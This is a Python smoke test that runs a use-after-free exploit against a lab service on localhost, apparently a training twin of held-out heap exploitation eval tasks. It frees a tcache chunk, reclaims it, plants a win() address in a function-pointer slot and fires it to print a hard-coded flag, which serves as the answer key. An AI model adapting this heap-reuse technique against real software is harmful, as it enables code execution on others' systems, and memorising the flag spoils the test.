#!/usr/bin/env python3
"""Smoke test for uaf_train_a (port 19991): use-after-free on a tcache
chunk, the call gated on a LIVE chunk (the tcache-REUSE path is the
win). MR6 training twin - the uaf_heap eval targets stay unseen.

The menu protocol ([f]ree [n]ew [p]aint [g]o [x]it, letters):
  1. n: the service prints "new: canvas at 0x<addr> (mounted)".
  2. f: the chunk lands in the tcache, `mounted` drops (the call is
     now gated - a `go` here would NOT fire).
  3. n: the tcache hands the SAME chunk back (the reuse), `mounted`
     rises again.
  4. p: the exploit writes the win() address (hex text) into the
     brush slot at +40 (past the tcache next and key).
  5. g: the live chunk's brush fires - win() reads the flag.

win() is at 0x4012b6 (measured on the local build, no-PIE: fixed per
binary; re-extract from the deployed lab binary with
`objdump -d uaf_train_a | grep '<win>:'` if its toolchain differs -
the constant here was NOT measured in the lab container).

Success output:

  FLAG: FLAG{uaf_train_a_reuse_paints_win}
"""

import re
import socket
import sys

HOST = "127.0.0.1"
PORT = 19991

WIN = 0x4012B6


def recv_until(s, needle, limit=4096):
    data = b""
    while needle not in data and len(data) < limit:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main():
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
    except OSError as e:
        print(
            f"SKIP: port {PORT} not listening ({e}); "
            "the lab stack is not running - deploy it and re-run"
        )
        return 0

    menu = recv_until(s, b"[x]it\n")
    print(f"[+] menu: {menu.decode(errors='replace').strip()}")

    # 1. new: the canvas mounts
    s.send(b"n\n")
    out = recv_until(s, b"new: ")
    assert b"mounted" in out, f"no new echo: {out!r}"
    print("[+] canvas mounted")

    # 2. free: the chunk goes to the tcache, the call is gated now
    s.send(b"f\n")
    out = recv_until(s, b"free: ")
    assert b"tcache" in out, f"no free echo: {out!r}"
    print("[+] freed (tcache holds it; the call is gated)")

    # 3. new again: the tcache hands the SAME chunk back (the reuse)
    s.send(b"n\n")
    out = recv_until(s, b"new: ")
    assert b"mounted" in out, f"no re-mount echo: {out!r}"
    print("[+] re-mounted (the tcache reuse)")

    # 4. paint: the win() address lands in the brush slot (hex text)
    s.send(b"p\n")
    s.send(f"{WIN:x}\n".encode())
    out = recv_until(s, b"paint: ")
    print(f"[+] paint echo: {out.decode(errors='replace').strip()}")

    # 5. go: the live chunk's brush fires - win() reads the flag
    s.send(b"g\n")
    out = recv_until(s, b"FLAG:")
    try:
        out += s.recv(4096)
    except (socket.timeout, TimeoutError):
        pass  # the flag line was the last output; nothing follows it
    print(f"[+] output: {out.strip()[-60:]!r}")
    assert b"FLAG{uaf_train_a_reuse_paints_win}" in out, "oracle flag missing"
    print("[+] uaf_train_a SMOKE TEST PASSED")
    return 0


if __name__ == "__main__":
    sys.exit(main())
